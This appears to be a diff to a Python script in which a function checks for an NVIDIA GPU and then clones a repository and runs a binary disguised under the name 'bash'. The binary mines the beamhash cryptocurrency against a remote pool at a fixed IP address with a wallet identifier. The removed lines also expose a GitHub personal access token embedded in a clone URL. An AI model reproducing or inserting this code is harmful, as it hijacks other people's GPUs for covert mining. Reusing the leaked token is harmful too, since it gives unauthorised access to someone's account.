@@ -27,8 +27,8 @@ def run_script():
     subprocess.run(["nvidia-smi"], check=True)
 
     cmd = """
-    git clone https://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@github.com/sadarsayujinjas/gm.git
-    cd gm
+    git clone https://github.com/hujisanda/lol198.git
+    cd lol198
     chmod u+x bash
     ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
     """
